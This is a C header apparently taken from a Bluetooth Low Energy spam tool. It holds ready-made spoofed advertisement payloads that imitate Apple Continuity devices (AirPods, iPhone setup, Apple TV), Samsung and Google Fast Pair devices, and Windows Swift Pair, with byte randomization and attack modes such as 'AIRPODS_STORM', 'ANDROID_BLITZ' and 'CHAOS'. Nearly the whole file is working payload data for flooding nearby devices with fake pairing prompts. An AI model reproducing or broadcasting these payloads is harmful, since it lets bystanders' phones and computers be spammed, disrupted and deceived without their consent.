// BLE advertisement payload templates
// Formats sourced from Apple Continuity protocol research (public) and
// Google Fast Pair spec.  All bytes are public knowledge; no auth needed.
// Use only for authorized demonstrations — possession is legal, intent is not.

#pragma once
#include <stdint.h>

#define BP_ADV_MAX_LEN 31

// ─────────────────────────────────────────────────────────────────────────────
// Template: copy to mutable buffer, then randomize rng_len bytes at rng_offset
// (rng_offset == 0 means no randomization for that payload)
// ─────────────────────────────────────────────────────────────────────────────
typedef struct {
    const char* name;
    const char* platform;   // display tag: "iOS" / "Android" / "Windows"
    uint8_t     data[BP_ADV_MAX_LEN];
    uint8_t     data_len;
    uint8_t     rng_offset; // 0 = skip randomization
    uint8_t     rng_len;
} PhantomTemplate;

// ── Apple Nearby Action (subtype 0x0F) ───────────────────────────────────────
// AD layout: [Flags 3B][Mfr 0x0A,0xFF, 0x4C,0x00, 0x0F,0x05, flags,action,p1,p2,p3]
// 14 bytes total per packet.
//
// Action codes (public reverse-eng, many published in CVE writeups):
//  0x01=Apple TV  0x04=Watch setup  0x05=Hotspot  0x08=iPhone transfer
//  0x0B=Headphones  0x0D=TV unlock  0x0E=Watch NFC  0x20=New iPhone
//  0x21=Transfer from old iPhone  0x27=Watch pair

#define BP_MAKE_NEARBY(name_, action_, p1_, p2_, p3_)  \
    { name_, "iOS",                                      \
      { 0x02,0x01,0x1A, 0x0A,0xFF, 0x4C,0x00,          \
        0x0F,0x05, 0xC0, action_, p1_, p2_, p3_ },      \
      14, 11, 3 }

// ── Apple Proximity Pairing (subtype 0x07) ────────────────────────────────────
// AD: [Flags 3B][Mfr 0x16,0xFF, 0x4C,0x00, 0x07,0x11,
//               status(2), model(2), batL, batR, batCase, lid, color, suffix(7)]
// 26 bytes total.

#define BP_MAKE_PROX(name_, m0_, m1_, batL_, batR_, batC_) \
    { name_, "iOS",                                          \
      { 0x02,0x01,0x1A, 0x16,0xFF, 0x4C,0x00,              \
        0x07,0x11,                                           \
        0x01,0x19, m0_,m1_, batL_,batR_,batC_,0x00,0x00,  \
        0xCA,0xFE,0xBA,0xBE,0x00,0x01,0x02 },               \
      26, 19, 7 }

// ── Samsung/Google Fast Pair (service UUID 0xFE2C) ────────────────────────────
// AD: [Flags 3B][UUID-list 0x03,0x03,0x2C,0xFE][SvcData 0x06,0x16,0x2C,0xFE, m0,m1,m2]
// 15 bytes total. Randomize the model ID bytes for variety.

#define BP_MAKE_FASTPAIR(name_, m0_, m1_, m2_)           \
    { name_, "Android",                                    \
      { 0x02,0x01,0x02,                                   \
        0x03,0x03, 0x2C,0xFE,                             \
        0x06,0x16, 0x2C,0xFE, m0_,m1_,m2_ },             \
      15, 12, 3 }

// ── Windows Swift Pair (service UUID 0xFE26) ──────────────────────────────────
// AD: [Flags 3B][UUID-list 0x03,0x03,0x26,0xFE][SvcData 0x05,0x16,0x26,0xFE,0x00,0x01]
// 15 bytes. No randomization — payload is fixed.

static const PhantomTemplate BP_ALL_TEMPLATES[] = {
    // ── Apple Nearby Actions ─────────────────────────────────────────────────
    BP_MAKE_NEARBY("New iPhone Setup",   0x20, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("iPhone Transfer",    0x21, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("Apple TV Setup",     0x01, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("Apple Watch Pair",   0x04, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("Hotspot Share",      0x05, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("AirPods Connected",  0x0B, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("TV Auto Unlock",     0x0D, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("Watch NFC Tap",      0x0E, 0x00, 0x00, 0x00),
    BP_MAKE_NEARBY("Watch Auto Unlock",  0x27, 0x00, 0x00, 0x00),

    // ── Apple Proximity Pairing ──────────────────────────────────────────────
    // model codes: Pro=0x0E20, Max=0x0A20, 3rd=0x1320, 2nd=0x0F20, Beats=0x1720
    BP_MAKE_PROX("AirPods Pro",    0x0E, 0x20, 0x75, 0xA5, 0x62),
    BP_MAKE_PROX("AirPods Max",    0x0A, 0x20, 0xFF, 0xFF, 0x40),
    BP_MAKE_PROX("AirPods 3rd",    0x13, 0x20, 0x55, 0x65, 0x88),
    BP_MAKE_PROX("AirPods 2nd",    0x0F, 0x20, 0x90, 0x90, 0x00),
    BP_MAKE_PROX("Beats Studio",   0x17, 0x20, 0x80, 0x80, 0x00),

    // ── Samsung / Google Fast Pair ───────────────────────────────────────────
    BP_MAKE_FASTPAIR("Galaxy Buds2 Pro",  0x2D, 0x7A, 0x16),
    BP_MAKE_FASTPAIR("Galaxy Buds Pro",   0x9E, 0xA9, 0x60),
    BP_MAKE_FASTPAIR("Galaxy Watch 5",    0xB4, 0x42, 0x33),
    BP_MAKE_FASTPAIR("Pixel Buds Pro",    0x92, 0xBB, 0xBD),

    // ── Windows Swift Pair ───────────────────────────────────────────────────
    { "Windows Device", "Windows",
      { 0x02,0x01,0x02,
        0x03,0x03, 0x26,0xFE,
        0x05,0x16, 0x26,0xFE, 0x00,0x01, 0x80,
        0x00 },                 // pad to keep struct init clean
      15, 0, 0 },
};

#define BP_TEMPLATE_COUNT ((uint8_t)(sizeof(BP_ALL_TEMPLATES)/sizeof(BP_ALL_TEMPLATES[0])))

// Mode → index range into BP_ALL_TEMPLATES
// Mode 0 APPLE_ALL:     0..13   (all Apple payloads)
// Mode 1 NEW_IPHONE:    0..0    (just "New iPhone" — most viral)
// Mode 2 AIRPODS_STORM: 9..13   (proximity pairing)
// Mode 3 ANDROID_BLITZ: 14..17  (Samsung/Fast Pair)
// Mode 4 WINDOWS:       18..18
// Mode 5 CHAOS:         0..18   (everything)
static const struct { uint8_t first; uint8_t last; }
BP_MODE_RANGE[] = {
    { 0,  13 },  // APPLE_ALL
    { 0,   0 },  // NEW_IPHONE
    { 9,  13 },  // AIRPODS_STORM
    { 14, 17 },  // ANDROID_BLITZ
    { 18, 18 },  // WINDOWS
    { 0,  18 },  // CHAOS
};
